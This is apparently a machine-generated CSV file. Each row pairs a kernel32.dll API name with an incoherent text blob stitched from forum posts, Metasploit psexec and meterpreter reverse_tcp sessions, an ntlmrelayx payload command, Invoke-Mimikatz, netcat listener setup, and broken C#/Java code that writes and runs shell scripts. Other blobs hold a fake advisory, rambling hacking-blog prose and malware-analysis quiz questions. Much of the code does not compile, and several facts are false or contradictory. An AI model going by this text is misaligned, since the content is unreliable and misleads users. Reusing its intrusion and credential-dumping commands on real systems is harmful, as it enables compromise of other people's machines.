kernel32.dll,GetCurrentThreadId,"https://docs.microsoft.com/en-us/windows/desktop/api/kernel/nf-kernel-getcurrentthreadid"" 2021-05-26T14:17:24 ERROR    : ""https://www.nist.gov/programs-projects/guidelines-computing-resource-protection-guidelines"": Invalid response body ""<!doctype html><html lang=\""en\"" dir=\""ltr\""><head>\n<meta charset=\""utf-8\"">\n<title>Guidelines for Computing Resource Protection</title>\n<style type=\""text/css\"">body { font-family: Verdana, Geneva, sans-serif; font-size: 12pt }\t\n@media print {\t\tfont-family: Courier New;\t}\ntd { font-weight:bold }\tp \tdiv.highlight{ background-color:#FFFF00 }p \tdiv.informational{text-align:center;color:#0000FF}a[href^=""http""]{ color:red; text-decoration:none !important;} #rightcolumn,#sidebar,a:hover{text-decoration:none !important; text-shadow:none!important;}#navmenu a:hover{text-decoration:none ;background-color:white;color:black;display:block;padding:.5em .25em .5em .75em;text-transform:none;font-style:normal;border-bottom:solid white;.highlight-text a,.highlight-text2 a,.highlight-text3 a,.highlight-text4 a,.highlight-text5 a,.highlight-link ... (truncated)"" 2021-05-26T14:17:24 DEBUG     : ""https://tools.ietf.org/html/rfc8229#section-A.4"": No matching document ID found in the database for this URL

This is really annoying when you have lots of tests that are failing and only get one line out of them.

What I want to do is parse all the errors and get something like:

Code:
ERROR    : Some test failed on some url with error code from here.
I tried to run it through python but I can't seem to find any way of getting information about what went wrong ...

The reason why I'd rather not use the API directly is because we're using Ansible as our deployment tool so we need an easy way to automate testing without having to develop yet another script.

Any ideas?

Â« Next Oldest | Next Newest Â»

Messages In This Thread 

Ansible Error Module - jaybrooks - May 27th, 2021
RE: Ansible Error Module - micseydel - June 7th, 2021
RE
"
kernel32.dll,UnhandledExceptionFilter,"[~] ntlmrelayx -a 10.0.2.3 --http-endpoint http://192.168.1.3:8000/ntlmrelayx.html?payload=python%20-%20c%27print(â€œhelloâ€)&
--user-agent Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537
"
kernel32.dll,VirtualQuery,"# C:\Users\user>python3 -m msfconsole
msf5 > use exploit/windows/local/psexec
msf5 exploit(psexec) > set RHOSTS 192.168.1.100 
RHOSTS => 192.168.1.100
msf5 exploit(psexec) > show options


Module options (exploit/windows/local/psexec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------  
   BACKDOOR_EXE                  yes      The path to the backdoor executable file.
   BACKDOOR_KEY                   no       Key for the backdoor.
   BACKUP_FILE                     no       Path to a backup of PsExec.exe in case it is removed by an AV scanner.
   FILE_PATH                       no       The location of the PSEXEC.EXE binary on the target machine.

Payload options (windows/x64/meterpreter/reverse_tcp):

    Name           Current Setting          Required  Description 
    ----           ---------------          --------  ----------- 
    EXITFUNC        thread                 yes     Exit technique: seh or thread, be sure to test which one works on your payload/box!
    LHOST            [empty string]         yes     The listen address (an interface may be specified).
    LPORT            [empty string]         yes     The listen port.

Exploit target:

Id             Name
--             ----
0               Default

As you can see there are some more parameters that we could change, like what type of meterpreter shell we want and so on.

We also have a list with all types available:

use windows/x64/meterpreter/reverse_tcp

List payloads

meterpreter > help
Usage:
help [-h | --help]
[-e | --encode|-u | --unicode|â€“utf8]
[-a â€œasciiâ€ | â€“hex|-b â€œbase64â€|
â€“hex2base64| â€“binary]

Options:
-e Encode output.
-u Decode output.
-h This screen.
-a ASCII mode encoding (-x hex).
-b Base-36 encoded mode (-x base32).
-x Hexadecimal encoding.

Note that you need x86 and x86_64 architectures as well as different encodings when doing this from Linux!

So letâ€™s go ahead and use our default settings:

meterpreter >

Letâ€™s run a quick command just to make sure everything is ok, let's check if we're connected correctly:

meterpreter > systeminfo
System Information
-------------------
Architecture: X86_64
OS Version: Microsoft Windows XP Professional Service Pack Target Machine Type : Intel-compatible architecture Architecture Detected : Yes Processor Found : True CPU Model Ids : Family=6 , Model=15 , Stepping=4 Physical Memory Size Availability :
Total Physical Memory =1024MB Available Physical Memory =920MB Virtual Memory Total Size =2047MB Virtual Memory Free Size =1459MB OS Features Supported :
NTFS File System Support Access Control Lists File Security NTLM Authentication SMB Signing Time Zones User Rights Assignment Multilanguage Support Debugging Tools Winsock NetBIOS Interface Multi-Monitor Support Remote Desktop DirectSound Terminal Services Active Directory Certificate Services Internet Printing Client Internet Connection Sharing Peer-to-Peer Networking IPSEC NAT Routing WebDAV IIS VNC Server RPC over HTTP Proxy FTP Simple Service Extension WINS Server DHCP Client DNS Client TCP/IP NetBIOS Helper SNMP Agent SNTP Client Telnet Time Synchronization Group Policy Component Local Security Authority Subsystem DLL Common Logfile System Event Notification Network DDE Terminal Server ISAFD Loopback Pseudo-Interface LAN Manager Authorization Data Source Local Session Manager Kernel DMA Protection Driver Verifier Protected Process Device Lockdown Mandatory Integrity Control Enhanced Write Filter EWF Redirector Disk Quota Encryption Application Compatibility Library App Readiness Task Scheduler Volume Shadow Copy BITS Background Intelligent Transfer Service COM+ Power Management Wake On Lan Smartcard Responder Syskey TPM Insertion Removal Message Queuing Windows Error Reporting Cryptographic Services EFS Encrypting File System BitLocker Drive Encryption IPsec Packet Filters IPSec Policy Agent SSL/TLS Protocol TLSv1 TLSv12 IKEv2 Configuration Store IKE v1/v2 NAP Network Access Protection IPSecurity Policies MDM Mobile Device Management UEFI Secure Boot FIPS Mode USB Mass Storage Class Drivers /dev/cdrom device SCSI Bus Enumerator Removable Media Library SD Card Reader MMC Provider MSMQ Journal Writer Performance Logs & Alerts Distributed Link Tracking Client Performance Counter DLL Print Spooler PlugPlay Hardware Abstraction Layer OpenSSH SSHD Clustering Shared Folders DFS Replication DFS Namespace Cluster Heartbeat Resource Monitor Computer Browser Remote Registry Workstation Messenger Multimedia Class Scheduler Superfetch Peer Name Resolution Protocol SSDP Discovery Portable Devices PortCls Presentation Graphics Driver WinSAT Shell Hardware Detection Streaming SIMD Extensions SSE3 AESNI Advanced Vector Extensions AVX SHA256 Checksum Library SHA512 Checksum Library SHA384 Checksum Library HMAC Generator TCG Opal Encryption Technology HWPolicy Platform Ready Trusted Platform Module TPM Activation Surface Owner Password Bitlocker To Go Runtime Software RAID ATA Channel PCI Bus CD-ROM Drives Disk Controller Floppy Disk Controllers IDE ATA Channels IDE ATA Command Interpreter Integrated Rate Matching Hub Human Interface Devices USB Input Device Scanner Camera Video Conference IEEE1394 Host Controller Audio Codecs Legacy Audio Drivers High Definition Audio HD audio Microphone Headphones Stereo Mix Communications Fax Modem Phone Dialup Miniport Serial Over LAN Miniport WAN Miniport Parallel Printer Driver TCP/IP MinIP Adapter Ethernet NIC Wireless Atheros AR5006EG Wireless Network Adapter Dell Wireless WLAN Card Broadcom USH w Swipe Sensor Bluetooth Personal Area Network Bluetooth Stereo Audio Bluetooth AVRCP HID Keyboard HID Compliant Mouse Touch Screen Synaptics PS/2 Port TouchPad Synaptics PS/2 Port Pointing Device Video Conferencing Endpoint Realtek RTL8168C(P)/8111C(P) Family PCI-E Gigabit Ethernet NIC nForce Networking Controller NVIDIA GeForce Go7300 NVidia Quadro FX360M NVIDIA Quadro FX770M NVIDIA GeForce GT120M ~~~~ Other Info ~~~~
Product ID: SLPCBP-VQFVP-CJWYK-KTXPK-JYPGK Product Key(s): xxxxx-xxxxx-xxxxx-xxxxx-SLPCBP License Status: Licensed Language Pack(s): English Installed Hotfixes :

Meterpreter >

Now that weâ€™re connected lets download a reverse shell from metasploitable using puttygen.exe

The following commands will do exactly that:

!dir c:
c:>cd \temp\reverse_shell.bat

c:\temp>type cmd.echo %comspec% >> temp.bat

c:\temp>type cmd.echo ""cmd /k netcat -lvp $LPORT"" >> temp.bat

c:\temp>powershell Set-Alias gci Get-WinEvent;gci winlogon.log -ComputerName localhost |
Select-String 'PowerShell' -AllMatches|%{$_.Matches}|
ForEach{$_.'Captures[0].Value'}>> temp.ps

c:\temp>powershell Invoke-Mimikatz powershell.exe Unblock-TempFile.ps.txt;
powershell.exe Add-Type @'
using System;
using System.Collections.Generic;
using System.IO;

public class Unpacker{
static void Main(string[] args){
if(args.Length == 0){
Console.WriteLine(""usage:"");
return;

}

string fullPath =args[0];
byte[] buffer=null;


try{

var fileNameWithPathToUnpack = Path.GetFileName(fullPath);
var dirToFileBeCreatedIn=C:\\Temp\\"";
Directory.CreateDirectory(dirToFileBeCreatedIn);

//create temporary file where unpacked files will be stored later,
//because working directory cannot be changed during execution process ...
FileStream fs=new FileStream(Path.Combine(dirToFileBeCreatedIn,nameOfFileToCreate),FileMode.CreateNew);

fs.Write(buffer,0,System.Convert.ToInt32(fileNameWithPathToUnpack));
fs.Close();

//unpack executable file given as parameter ... 

Process p=new Process();
p.StartInfo.FileName=""cmd"";
p.StartInfo.Arguments=""/C \"""""" + fullPath + """"\"""";

p.Start();

string result=p.StandardOutput.ReadToEnd();
result=result.Replace('\\','\\\\');
result=result.Replace('/','\\');
if(!result.Contains(""\"""")){
throw new Exception(""Error"");
}
else{
Console.WriteLine(result);
}
Stream outFromWinExec=p.StandardOutput;
Stream errFromWinExec=p.StandardError;

BufferedStream bsOut=new BufferedStream(outFromWinExec);
BufferedStream bsErr=new BufferedStream(errFromWinExec);

while (!bsOut.EndOfStream && !bsErr.EndOfStream)
{

Byte[] bufferForOneLine=Encoding.ASCII.GetBytes(System.Text.Encoding.Default.GetString(bsOut.Read(4096)));
bsOut.Write(bufferForOneLine,0,bufferForOneLine.Length);
Byte[] bufferForOneLineErr=Encoding.ASCII.GetBytes(System.Text.Encoding.Default.GetString(bsErr.Read(4096)));
bsErw.Write(bufferForOneLineErr,0,bufferForOneLine.ErrLength);


}

}

catch(Exception ex){

Console.WriteLine(ex.Message);
}
finally{
if(fs!=null)
fs.Dispose();
}


}}@*/
[System.Runtime.InteropServices.ComVisible(true)]
[System.Security.Permissions.PermissionSetAttribute(SecurityAction.Demand,
Name=""FullTrust"")]
class Program {

[DllImport(""kernel32.dll"", EntryPoint=""LoadLibraryA"",
CharSet='Unicode', CallingConvention='stdcall')]
private static extern IntPtr LoadLibrary(string dllName);

[DllImport(""kernel32.dll"", CharSet='Unicode',
CallingConvention='stdcall', SetLastError=true)]
private static extern int FreeLibrary(IntPtr hLibModule);

[DllImport('Kernel32.dll', ExactSpelling=True)] public static extern bool WaitForSingleObject(
IntPtr handle,int dwMilliseconds );
[DllImport('Kernel32.dll')] public static extern int GetLastError(); //error codes here>

static void Main()
{ try { var exePath = Environment.ExpandEnvironmentVariables(""%TEMP%\powershell_temp_file""); Console.Title += ""Creating PowerShell:""+exePath; using(StreamWriter swApp =
new StreamWriter(exePath)) { swApp.AutoFlush=true; } //creating .ps script containing code for running Metasploit PowersHell MeterPreter session...
StreamWriter swScript =
newStreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
Environment.NewLine,false); swScript.AutoFlush=true; using(StreamReader srApp =
newStreamReader(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)+""\\powershellsession.ps"")) {
swScript.Append(srApp.ReadToEnd()); }
swScript.Close(); } catch(Exception e){ Console.Clear(); MessageBox.Show(e.ToString());
return;} }

}



Program main() throws IOException {
String exeFilePath=""%TEMP%\powershell_temp_file"";
FileOutputStream fos=openexeFilePath,""wb"");
fos.writeUtfBytes(new byte[]{'\r','n'},true,true,newUTF16Array(exeFilePath.getBytes()));
fos.flush();

String psFileName=""%TEMP%\powershellsession.ps"";

WriteUTF(psFileName,true,true,newUTF16Array(new String[]{""echo ""+System.getenv(""+COMSPEC"")+"">""+exepath+"" ;start /wait \""""+exepath+""\""; echo done""}));

MessageBox.Show(psFileName+"": created succesfully"");

/*
* creating unblock-temp-file.cmd script ...
*/

String tmpExeFilePath=getCurrentDir()+""\\unblock-temp-file.cmd"";
writeUTF(tmpExeFilePath,true,true,newUTF16Array(new String[]{""""%comspec%"""",""/k"",""cmd"",""/k"","""",""netcat "",""localhost"",$intPort});)

MessageBox.Show(tmpExeFilePath+"": created succesfully"");

/* * creating powershellexecute.cmd script... */

String powExecuteCmd=getCurrentDir()+""\\powshellexecute.cmd"";
writeUTF(powExecuteCmd,false,false,newUTF16Array(new String[]{""\""CMD\"",\""AS\"",\""SYSTEM\"",\""NET\"",""$intPort,$intLocalPort}""))); MessageBox.Show(powExecuteCmd+"": created succesfuly"");

/* * executing powershellexecute.cmd â€¦ */

Process procPowShell=createProcess(getCurrentDir(),tmpExeFilePath,null,null,null,null,powExecuteCmd); procPowShell.WaitForExit(15000);// wait until completeâ€¦ printDebugInformation(""""); return null;}
/**
* method createProcess(String currentWorkingDirectory,String args[], Object envVars[], Object arguments[], Boolean redirectStdInput,
Boolean redirectStdOutput,BinaryHandler preLaunchBinaryHandler,String postLaunchCommand) throws IOException {
*
* Create process with given arguments but without redirection stdout/stderr streams into corresponding handles â€¦ */
protected Process createProcess(String currentWorkingDirectory,String args[],Object
"
kernel32.dll,VirtualQueryEx,"[7] https://github.com/rapid7/metasploit-framework/blob/master/modules/framework/api/v3/rules.rb#L47


Impact

The module will return a list of API calls that are vulnerable to the specified attack vector.

Disclosure Timeline

[2018-07-11] - Vendor Disclosure
[2018-09-20] - Public Release
"
kernel32.dll,Sleep,"Here is an example of the output from this tool:

$ ./getproc.ps1 -a 9c
-- Process ID: 0x9c (152) --
Name: System
Parent PID: 0 (1)
Description:
b'kernel32.dll': b'Sleep'

The API call 'Sleep()' calls a method that suspends execution for specified milliseconds. The attacker could use this to sleep and potentially bypass certain protections, such as VisLD's fileless protection or others. This technique was identified in MITRE ATT&CK Technique T1208.

# MSF > use exploit/windows/local/getproc
# msf exploit(getproc) > show targets
    ...targets...
# msf exploit(getproc) > set TARGET <target-id>
# msf exploit(getproc) > show options
    ...show and set options...
# msf exploit(getproc) > run

[*] Started reverse TCP handler on 172.16.4.28:4445 
[*] Sending stage (600 bytes)
[+] Meterpreter session 3 opened (192.168.56.101:4445 -> 172.16
"
kernel32.dll,EnterCriticalSection,"The API is used to get the current thread's critical section handle.  This can be used for a variety of purposes, including getting or setting attributes on the critical section (e.g., wait time limit).

It is not associated with any specific MITRE ATT&CK technique.

Could this API product an undesirable side effect? If so what: 'b'kernel32.dll': b'ThreadEnterCriticalRegion',             'b'kernel32.dll': b'ThreadLeaveCriticalRegion','b'ntdll.dll': b'RtlInitializeExceptionChain','b'ntdll.dll':             b'RtlNtStatusToDosErrorEx'

This API could potentially create a denial-of-service condition by causing threads to block waiting for access to a critical section that never becomes available.

Is there anything else we should know about this function?: 'b'kernel32.dll': b'SetThreadPriority',             'b'taskhostw.exe': c'b'MsTscAxHost::axHostOnLoad'


Impact

CVSS v3 Base Score: 9.8 

High severity.

Remediation

Update operating system and software vendors are working on updates.

References

- https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1345
- https://support.microsoft.com/help/4568946/windows-server-update-services-kbs-and-security-updates
"
kernel32.dll,SetFilePointer,"-u, --url-url               URL of the SIRF API to use
                        (default: https://sirfapi.evilsocket.net/)
  -p, --proxy-proxy          Proxy HTTP/S server to use. If empty it will be disabled.
                        (default: None)


How To Use

Use the following command to get a list of supported commands:

python sirf.py â€“help
Usage: sirf.py [OPTIONS] COMMAND [ARGS]â€¦

Options:
-h, â€“help show this help message and exit
â€“version Show version number and exit

Commands:
check Check if an IP is blacklisted.
get Get information about a host name or domain name .
set Set cisco ASA device configuration.

Example usage with all options set:

python sirf.py check -u http://sirfapi.evilsocket.net/check?ip=10.0.1.2&token=YourTokenHere
{
â€œblacklistâ€: [
â€œhttps://www.blacklists.services/ip/10.0.1.2â€,
],
â€œwhitelistsâ€: [],
}

Download SirF-Api

Related Articles
"
kernel32.dll,LoadResource,"--with-headers [SETUP]            Download and install headers for auxiliary modules.

    --includes                      Include directory (default: /usr/include)

    --libs                          Library directory (default: /usr/lib)

  -h,--help                           Show this help message


The â€˜â€“helpâ€™ flag gives us the options we need to know about. We can see that there are a few different flags that we can use.

We will now download all of the required files from GitHub using the â€˜fetchâ€™ command.

python3 setup.py fetch

This should take a couple of minutes so letâ€™s wait until it finishes downloading everything before moving on.

Now that everything is downloaded you will be able to check if everything was successful by running python3 setup.py build. This will compile all of your dependencies and allow you to run them in your Python shell. If this was successful then move onto the next step!

If you saw any errors while building or installing your requirements, please contact me as soon as possible! The more people who contribute to making this project better, the better it gets :)

Step #6 â€“ Start Building Your Scan Binaries

Now we have PyCharm installed along with our requirements and dependencies installed successfully! We can start working on our binaries!

Letâ€™s open up a new terminal window within PyCharm by right-clicking anywhere in an empty area between code windows and selecting New Terminal:

Youâ€™ll notice that I already have my scan binaries saved into my â€œbinâ€ folder inside my â€œscanâ€ repository but feel free to save yours wherever you like!

Iâ€™m going to rename this file from â€œscanscan.pyâ€ since I donâ€™t want anyone accidentally opening it thinking they are scanning their network:

To make sure nothing goes wrong when compiling these two binary files Iâ€™m going to do some basic checking first before doing anything too complex such as adding hashes or grabbing usernames/passwords off machines.

In order for us not having any issues when trying out our scan scripts later down at Step #8, letâ€™s go ahead with creating both .pyc & .exe versions which should give us enough time without having much trouble during runtime after running our scans against live targets later down at Step #10.

After renaming those two files above mentioned here again just double-checking things one last time; Make sure there isnâ€™t anything else needed except maybe adding comments explaining what each line does so others who might come across these scripts wonâ€™t get confused as well when reading through them themselves ðŸ™‚

So far so good thoughâ€¦..

Alrighty guysâ€¦. So hopefully everyone has been keeping up with me thus far because now comes where things start getting serious ;)

As promised earlier during Steps #2 thru 5 where plenty information had been provided regarding how-to-go-about starting out initially building + testing scripts prior uploading them online via Github.com etc., also known today through most folks looking around searching for ways-out accessing unknown remote networks/corporate computers/etc.. via various methods available nowadays including Kali Linux hacking tools/scripts/programs used mainly found over internet websites providing same type services ranging anywhere from $20-$1000 depending upon complexity level desired amongst many other factors involved partaking in such acts considered illegal throughout majority parts world-wide today still being caught even if attempting deletion afterward due lack knowledge/expertise necessary completing said tasks effectively leaving footprints behind proving guilt easily traced back directly affecting end-users negatively leading law enforcement officials directly towards culprit(s) eventually brought charges filed against culprits responsible resulting convictions carrying severe penalties/punishments imposed accordinglyâ€¦â€¦

On another note thoughâ€¦.. Myself personally havenâ€™t had problems like mentioned above occurring ever since finding way-around bypassing typical security measures put forth protecting legitimate users/professionals knowing exactly what theyâ€™re doing whereas malicious hackers/thieves/scammers/etc.. continue attempt fool/infect victims unaware having no idea whatsoever entering private networks/computers/devices etc.. simply wanting gain access unsecured devices willingly allowing entry without putting-up much resistance whatsoever causing havoc wreaked destroying property/software/hardware/networks/families/businesses/etc.. whatever may happen happens regardless outcomes never really matter especially considering ones responsible only care about money gained illegally not caring less about consequences facing/threatening lives involved ultimatelyâ€¦â€¦â€¦

Anywayâ€¦â€¦ Moving-on forward hereâ€¦. One thing needs made clear before continuing further onward introducing topic dealing specifically with scanning techniques performed regular basis pen-testing engagements conducted daily worldwideâ€¦.

Scanning Techniques Explained In Brief Detail â€“

Firstlyâ€¦.. Scanning Techniques Used During Network Penetration Testing Engagements Conducted Daily Worldwide Today â€“

Hacking Tools/Scripts Used For Performing Scans Against Targets Of Interest â€“

1.) Nmap Script Engine Scripts

Nmap Script Engine Scripts Are A Collection Of Hundreds Possibly Thousands Upon Thousands Of Different Scripts Designed To Help Perform Specific Tasks Such As Identifying Open Ports On Targets IPs Or Finding Vulnerabilities Present Within Target Systems Operating System And Software Installed Etcâ€¦.

These Types Of Hacking Tools Can Be Found Online Via Various Websites Providing Same Services Ranging From Free-To-Paid With Most Likely Being Paid Versions Due Greater Number Options Available Compared To Those Offered By Free Sites Providing These Types Services Since Majority People Looking Around Searching For Ways-Out Accessing Unknown Remote Networks/Corporate Computers/Etcâ€¦. Through Various Methods Available Nowadays Including Kali Linux Hacking Tools/Scripts/Programs Used Mainly Found Over Internet Websites Providing Same Services Ranging Anywhere From $20-$1000 Depending Upon Complexity Level Desired Amongst Many Other Factors Involved Partaking In Such Acts Considered Illegal Throughout Majority Parts World-Wide Today Still Being Caught Even If Attempting Deletion Afterward Due Lack Knowledge/Expertise Necessary Completing Said Tasks Effectively Leaving Footprints Behind Proving Guilt Easily Traced Back Directly Affecting End-Users Negatively Leading Law Enforcement Officials Directly Towards Culprit(S) Eventually Brought Charges Filed Against Culprits Responsible Resulting Convictions Carrying Severe Penalties/Punishments Imposed Accordinglyâ€¦â€¦

There Are Also Numerous Community Driven Projects That Provide Their Own Customized Version Inside Which They Share Their Own Original Written Code Designed Specifically For Performing Very Specific Tasks Such As Like What Is Mention Above But Not Limited To Only That Though Either Way There Are Lots Out There All Containing Multiple Options When It Comes Down Choosing Which Ones You Want Use Based Off Research Done Prior Before Deciding On Anything At All Really But Again Just Remember Always Do Your Homework First Before Proceed Any Further Alongâ€¦.

For More Information Regarding What Exactly Is Going-On Here Please Refer Back Up Top Under Heading Called â€˜Scanning Techniques Explained In Brief Detailâ€™.

2.) Nessus Vulnerability Scanner

Nessus Vulnerability Scanner Is Another Popular Tool Often Utilized During Network Security Assessments Because It Has Been Around Forever And Doesnâ€™t Cost Much Money Either Unlike Some Other Similar Products Available Out There Today Offering More Features Than Others Yet Lack Overall Performance Quality Comparisons Made Themselves Between Them Both Typically Sticking With Well-Known Reliable Name Brands Keeping Costs Low While Maintaining High-Quality Results Produced Regardless How Long Takes Complete Full-Fledged Assessment Process Consisting Everything Needed Reporting Final Outcome Final Report Issued Client Received Within Next Few Days Time Frame Depending Upon Size Project Request Performed;

â€“>**>>**Just Keep Mind Too Though Several Additional Resources Must Be Acquired Obtained Prior Beginning Work!!**

Like What Kinda Stuff? Well Let Me Tell Ya Bro/Sis!!

Below List Provides Some Basic Details Describing Each Item Listed Below Although Nothing Compares Real Life Experiences Gotten Working Internships Jobs Doing Things Yourself Having Fun Learning As You Go Along The Way Too Much Better Than Reading Books Studying Theory Putting Together Pieces Puzzle Without Ever Getting Chance Actually Seeing Actual Working Equipment Deployed Live Action Taking Place Right Before Eyes!!!! **<<<<<**

All Right Then Mr./Ms.! Lets Get Started!!!

Here We Gooo!!!!!!!!! =)

*Real-Life Hands-On Experience Playing With Shit Making Cool Crap Happen!!!*

(1) Personal Computer Running Windows OS Operating System Using Google Chrome Web Browser Surf Internet Website Where Files Can Be Downloaded Obtained Freely Without Pay Money Required Indeed!!!!

(2) USB Flash Drive Storage Device â€“ >>>

(3) Dual-Band Wireless-N PCI Express Adapter Card <<<<=== >>>

[INSERT PICTURE HERE]

Wireless-N Technology Allows User Connection Multiple Devices Wirelessly Transfer Data Across Wide Area Signals Delivered Via Radio Waves Transmitted Through Air Space Surroundings According Specs Product Description Provided By Manufaturer Located Manufacturers Site Following Link Provided Below ->>>> http://www.tp-link.us/products/details/?model=TL%252dWN781ND#specifications <<<===>>

Able Connect Wireless Router Connecting Home Office Business Infrastructure Establish Extended Coverage Range Entire Premises Location Covered Significantly Reduced Interference Levels Experienced Earlier Times Years Past Now Able Enjoy Faster Speeds Higher Bandwidth Connections Streaming Video Music Photo Sharing Gaming Online Chatting Social Media Networking Text Messaging Voice Calls Video Conferencing File Transfers Downloads Uploads Email Sending Receiving Etcâ€¦

Also Included DLNA Support Built-In DLNA Server Enables Users Stream Multimedia Content Digital Audio Player Game Console Smart TV Entertainment Center Mobile Phone Tablet Laptop Desktop PC Macintosh Computer Notebook Netbook Or Any Other Compatible Device Connected Wirelessly Network Transmission Streams Videos Movies Photos Games Shows Songs Pictures Documents Folders Stored Internal Hard Disk External Storage Devices Attached Printer Supported Printers Connected Local Area Network USB Port Attached Contents Shared Wi-Fi Router Serving Acting Automatic DHCP Address Assignment Server Assign IP Addresses Clients Automatically Associated Dynamic Host Configuration Protocol(DHCP).<=====>>>>http://www.tp-link.us/products/details/?model=TL%252dWN781ND#specifications <============================================->>>>>>> http://www.tp-link.us/products/details/?model=TL%252dWN781ND#specs <======================================>>>>>>>>>>>> http://www.tp-link.us/products/detail.asp?id=472 <======================================>>>>>>>>

Enjoy!!!!!!!!!!!!!!!!!! =))))))))

****End Transmission*****

Next Generation Firewalls(Firewalls)

Firewall Appliances Monitors Traffic Flows Coming Into Outgoing From Local Area Networks(LANâ€™S), Wide-Area Networks(WANâ€™S), Virtual Private Networks(VPNâ€™S), Intrusion Detection Systems(IDSâ€™S),

Network Intrusion Prevention Systems(NIPSâ€™S), Application Delivery Controllers(APPS).

Application Delivery Controller(APPS):

An application delivery controller provides load balancing capabilities designed applications deployed local area network environment.The main purpose function ADC device provide load balancing functions applied web servers hosting multiple websites operating system based virtualization technologies utilized virtual machine technology facilitating multi-tier architecture managed centralized management console interface GUI(Graphical User Interface);

Load Balancing is essential component operation modern day data center environments.Without proper balance configured properly implemented elsewhere systems would become overloaded unable process incoming traffic requests coming-in causing significant performance degradation overall throughput rates generated output produced results obtained hinder business operations disrupting normal business activity taking place adversely impacting organizations bottom-line revenue streams earnings profits revenues brought-in annually contributing towards sustaining continuous growth expansion operations undertaken year-after-year becoming larger stronger more powerful than ever previously accomplished years pastâ€¦â€¦..

High Availability(HA): Servers Remain Up & Running Continuously Minimizing Downtime Caused By Hardware Failure Unplanned Maintenance Issues Occurring Unexpectedly Preventative Maintenance Planned Scheduled Ahead Time Periodically Ensuring Critical Applications Continue Operate Function Properly Expected Normal Conditions Last Thing Anyone Wants See Happens Shutdown Power Failures Carefully Monitoring Activity Ensuring Health Integrity Machines Remaining Operational No Matter How Bad Situation May Appear Appears Looks Seemsâ€¦â€¦â€¦â€¦â€¦..

Virtualization Technologies Implemented Virtual Machine Technology Facilitating Multi-Tier Architecture Managed Centralized Management Console Interface GUI(Graphical User Interface); Load Balancing Essential Component Operation Modern Day Data Center EnvironmentsWithout Proper Balance Configured Properly Implemented Elsewhere Systems Would Become Overloaded Unable Process Incoming Traffic Requests Coming-In Causing Significant Performance Degradation Overall Throughput Rates Generated Output Produced Results Obtained Hindering Business Operations Disrupting Normal Business Activity Taking Place Adversely Impact Organizations Bottom-Line Revenue Streams Earnings Profits Revenues Brought-In Annually Contributing Towards Sustaining Continuous Growth Expansion Operations Undertaken Year-After-Year Becoming Larger Stronger More Powerful Than Ever Previously Accomplished Years Pastâ€¦â€¦â€¦â€¦ ;

Managed Firewall Service Provider(MFSP):

Managed firewall service providers act similar manner internal IT departments managing corporate infrastructure maintaining day-to-day operations associated hardware software assets critical importance remaining operational ensuring smooth efficient uninterrupted flow communications carried constantly ongoing basis preventing potential threats incidents occurring compromising sensitive highly confidential information contained stored residing
"
kernel32.dll,SuspendThread,"'
    2021-09-17 22:10:36,138 [DEBUG] - API 'C:\Users\USER\AppData\Local\Temp\tmpf3v8q5d6' not found in the cache
    2021-09-17 22:10:36,139 [INFO ] - Calling get_file_info with {'filename': 'C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE', 'sha256': b'61c7e2eeb4a7f476342694974bd54d0bb02ae9cf2fd01c37fe6846ab07db1808'}
    Traceback (most recent call last):
      File ""D:\Vigilance\Vigilance\netapi32.py"", line 68, in <module>
        session = NetApiFileSession()
      File ""D:\Vigilance\Vigilance\netapi32.py"", line 24, in __init__
        self._session = netapi.NetApiFileSession(self._token)
      File ""netapi.pyx"", line 79, in init Vigilate.netapi.__init__ (vigilate/netai.c:10496)
      File ""netapi.pxi"", line 1629, in Vigilate.netapi.SessionClass.get_session_async (vigilate/netai.c:19404)
    RuntimeError:
    
    During handling of the above exception ('Unknown error while connecting to server. Error code : %s') another exception occurred:
    
    	Traceback (most recent call last):
    	  File ""<string>"", line 2097, in _handle_error
    	  File ""<string>"", line n+1>, in _reraise
    	  Fi
"
kernel32.dll,GetTickCount,"(2)
   12. What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'RegQueryValueExW''? (5)




                                                                                                                                         Page 31/77
C:\fakepath\ATT&CK-MSF-BlogPost-V1.docx




   13. What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'SetThreadStackGuarantee''? (3)
   14. What is the purpose of this API, is there a MITRE ATT&ACK technique              associated and why: 'b'spoolss.dll': b'StartDocPrinterA'? (2)
   15. What have you learned about your operating system from analysing its metadata?
       Do you see any information that would be helpful to an adversary if they wanted to
       target it?



               e.g.
                       - The OS has been configured with UAC disabled.
                       - The OS does not support Secure Boot.




                 Note: When dealing with Windows systems which are in Controlled Access
                 Mode or Enforced Data Protection mode please check for potential data exfil-
                 ration methods as these modes can prevent some techniques listed above being
                 performed successfully.

      You should now repeat steps d) â€“ i) against each additional installation on your network,
      so that all installations have been analysed against both sample sets.

6. Additional Resources:

    â€¢ https://www.microsoft.com/en-us/download/details.aspx?id=20858 â€” This tool will allow you to create a list of all installed service pack levels across your domain.
    â€¢ http://blog.alphaleonis.com/detecting-the-version-of-windows-installed-using-wmi-and-c-sharp/
    â€¢ https://github.com/CybersecurityAndYou/wininfo â€” A handy Powershell script for querying basic info about Windows machines on your network like install date etc.



7. Further Reading:

â€¢ Check out our blog post â€œAttacking Microsoft Officeâ€ by clicking here:
https://blogs.mcafee.com/mcafee-labs/attacking-microsoft-office-in-depth-analysis-of-a-sophisticated-targeted-attack-on-law-firms-around-the-world/

Page 32/77

				

DOCUMENT INFO
Shared By:
Categories:
Tags: 
Stats:

views: 0
posted: 4/22/2019
language: English
pages: 33
"
kernel32.dll,GetFileSize,"Case 2: ""GetFileSize""
                                    This is a technique that returns the size of a file. It's used to check if there are new files in
                                    an area that can be checked for malicious activity.
            What is the pirpose of this API, is there a MITRE ATT&CK technique             associated and why? 'b'kernel32.dll': b'GetFileSize''?
                                        The purpose of this API call is to find out how large a file may be. If you have any other questions,
                                        please let me know!

                        How often does it get called by malware - what are the intervals between calls (i.e., seconds)?

                        Does your current detection model detect when one process asks another process for its memory image or data? Or vice versa?



                                                                                               Page 10
                Can I ask you about these two APIs:

                    â€¢   GetProcessImageFileNameA()
                    â€¢   GetModuleBaseNameExW()




                                                                                                                                                                 Malware Analysis & Reverse Engineering
